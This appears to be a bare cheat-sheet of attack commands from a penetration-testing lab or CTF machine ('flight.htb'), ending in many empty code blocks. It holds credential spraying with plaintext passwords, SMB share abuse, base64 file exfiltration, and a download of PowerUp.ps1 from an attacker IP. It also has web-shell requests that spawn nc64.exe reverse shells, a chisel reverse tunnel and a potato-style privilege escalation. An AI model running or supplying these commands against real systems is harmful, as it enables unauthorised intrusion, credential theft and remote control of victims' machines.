[[Editing Copy Page]]

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13'
```

```
smbclient -U 'svc_apache' '//10.129.228.120/Users' -c "recurse;ls"
```

```
S@Ss!K@*t13
```

```
nxc smb 10.129.228.120 -u 'S.Moon' -p 'S@Ss!K@*t13'
```

```
S@Ss!K@*t13
```

```
S@Ss!K@*t13
```

```
smbclient //school.flight.htb/shared-u S.Moon -p 'S@Ss!K@*t13'
```

```
smbclient -U 'C.Moon' //10.129.42.56/Shared -c 'put test.txt'
```

```
smbclient -U 'S.Moon' -L //10.129.42.56
```

```
smbclient //flight.htb/shared -u S.Moon 'S@Ss!K@*t13'
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.42.56 -u 'C.Bum' -p 'Tikkycoll_431012284'
```

```
smbclient //flight.htb/Web -u C.Bum 'Tikkycoll_431012284'
```

```
powershell -c "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\C.Bum\Desktop\20260912173225_BloodHound.zip'))"
```

```
powershell wget http://10.10.17.95/PowerUp.ps1 -OutFile C:\Users\C.Bum\Desktop\PowerUp.ps1
```

```
curl school.flight.htb/styles/shell.php?cmd=nc64.exe -e cmd.exe 10.10.17.95 53
```

```
curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.17.95 53'
```

```
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.17.95:88 cmd
```

```
1..254 | ForEach-Object { $ip = "10.10.10.$_"; $t = New-Object System.Net.Sockets.TcpClient; $a = $t.BeginConnect($ip, 445, $null, $null); if ($a.AsyncWaitHandle.WaitOne(50, $false) -and $t.Connected) { Write-Host "$ip has port 445 OPEN" }; $t.Close() }

```

```
start /b chisel.exe client 10.10.17.95:9999 R:8000:127.0.0.1:8000
```

```
gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.17.95 5985"
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```